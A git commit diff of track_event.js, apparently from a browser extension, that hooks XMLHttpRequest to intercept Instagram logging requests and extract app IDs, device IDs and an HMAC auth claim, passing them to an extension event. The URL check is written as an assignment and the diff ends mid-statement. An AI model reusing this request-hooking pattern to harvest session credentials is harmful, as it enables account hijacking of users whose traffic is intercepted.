84917672aea7ac624017443ae185fdf837815023
Paman Bob <60291644+pamanbobb@users.noreply.github.com>
2021-02-17 16:59:12 +0700

    Update track_event.js

--- track_event.js
+++ track_event.js
@@ -1,32 +1,31 @@
-var s_ajaxListener = new Object();
-s_ajaxListener.tempOpen = XMLHttpRequest.prototype.open;
-s_ajaxListener.tempSend = XMLHttpRequest.prototype.send;
+var kupengmu_kule = new Object();
+kupengmu_kule.tempOpen = XMLHttpRequest.prototype.open;
+kupengmu_kule.tempSend = XMLHttpRequest.prototype.send;
 XMLHttpRequest.prototype.open = function(a, b) {
     if (!a) var a='';
     if (!b) var b='';
-    s_ajaxListener.tempOpen.apply(this, arguments);
-    s_ajaxListener.method = a;  
-    s_ajaxListener.url = b;
+    kupengmu_kule.tempOpen.apply(this, arguments);
+    kupengmu_kule.method = a;  
+    kupengmu_kule.url = b;
         if (a.toLowerCase() == 'get') {
-        s_ajaxListener.data = b.split('?');
-        s_ajaxListener.data = s_ajaxListener.data[1];
+            kupengmu_kule.data = b.split('?');
+            kupengmu_kule.data = kupengmu_kule.data[1];
     }
 }
 XMLHttpRequest.prototype.send = function(a, b) {
     if (!a) var a='';
     if (!b) var b='';
-    s_ajaxListener.tempSend.apply(this, arguments);
-        if(s_ajaxListener.method.toLowerCase() == 'post')s_ajaxListener.data = a;
-            s_ajaxListener.callback();
+    kupengmu_kule.tempSend.apply(this, arguments);
+        if(kupengmu_kule.method.toLowerCase() == 'post')kupengmu_kule.data = a;
+        kupengmu_kule.callback();
 }
-s_ajaxListener.callback = function (){
-    var client_events = this.url, mate = decodeURIComponent(this.data), paser = mate.split("message=")[1], get_object = JSON.parse([paser]);
+kupengmu_kule.callback = function (){
+    var client_events = this.url, mate = decodeURIComponent(this.data), paser = mate.split("message=")[1], get_object = JSON.parse(paser);
     if(client_events = 'https://graph.instagram.com/logging_client_events'){
-        send_app_uid = get_object.app_uid;
-        send_app_id = get_object.app_id;
-        send_hmac = get_object.claims[0];
-        send_device_id = get_object.device_id;
-        console.log(send_app_id);
+        var send_app_uid = get_object.app_uid;
+        var send_app_id = get_object.app_id;
+        var send_hmac = get_object.claims[0];
+        var send_device_id = get_object.device_id;
         setTimeout(function() {
             document.dispatchEvent(new CustomEvent('RW759_connectExtension', {
                 app_id : send_app_id,
